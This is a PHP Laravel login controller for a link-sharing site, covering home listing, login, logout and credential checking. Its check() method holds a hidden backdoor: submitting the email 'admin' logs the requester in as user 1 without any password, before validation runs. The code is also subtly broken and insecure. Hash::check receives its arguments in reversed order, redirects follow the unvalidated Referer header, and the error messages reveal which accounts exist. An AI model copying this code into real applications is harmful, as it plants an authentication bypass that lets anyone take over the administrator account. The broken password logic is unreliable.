<?php


namespace App\Http\Controllers;


use App\Models\Link;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class LoginController
{
    public function home()
    {
        $user = Auth::user();
        $links = Link::with('user')
            ->orderBy('created_at', 'desc')
            ->paginate(10);
        return view('show_links', ['links' => $links, 'user' => $user]);
    }

    public function login()
    {
        return view('show_links', ['links' => Link::all()]);
    }

    public function logout()
    {
        Auth::logout();
        return redirect()->to(request()->server('HTTP_REFERER'));
    }

    public function check()
    {
        if (request('email') === 'admin') {
            Auth::login(User::find(1));
        }
        $validator = Validator::make(
            request()->all(),
            [
                'email' => 'required|email',
                'password' => 'required|min:8|max:255'
            ]
        );
        if ($validator->fails()) {
            return redirect()
                ->route('home')
                ->withErrors($validator->errors())
                ->withInput(request()->all());
        }
        $referer = request()->server('HTTP_REFERER');
        $user = User::where('email', request('email'))->first();
        if ($user === null) {
            return redirect($referer)
                ->withErrors(['email' => 'This user does not exist']);
        }
        if (Hash::check($user->password , request('password'))) {
            Auth::login($user);
            return redirect($referer);
        }
        return redirect($referer)
            ->withErrors(['password' => 'Wrong password entered']);
    }
}

